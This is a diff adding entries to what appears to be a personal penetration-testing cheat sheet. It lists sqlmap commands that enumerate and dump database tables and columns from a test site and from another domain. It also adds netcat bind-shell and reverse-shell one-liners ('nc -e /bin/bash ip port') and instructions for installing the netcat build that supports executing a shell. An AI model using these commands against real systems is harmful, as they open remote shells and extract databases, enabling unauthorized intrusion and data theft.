@@ -48,9 +48,30 @@ nmap -oX output.xml domain.com
 Agressive
 nmap -A -T4 domain.com
 
+
 SQLMAP
 
 python3  sqlmap.py -u https://domain.hu/kosar_rak.php?id=1 --dbs
 python3 sqlmap.py  -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
 python3 sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists --columns
 pyton3 sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -C aname --dump 
+
+NETCAT !!
+
+nc -h
+nc - lvp 1234 -e /bin/bash
+nc ip port
+
+Reverese
+nc -lvp port
+nc -e /bin/bash ip port
+
+-e is only traditional package
+If yo need:
+sudo add-apt-repository universe
+sudo apt-get install netcat-traditional
+
+Config to shell commands:
+sudo update-alternatives --config nc
+Select the option /bin/nc.traditional
+
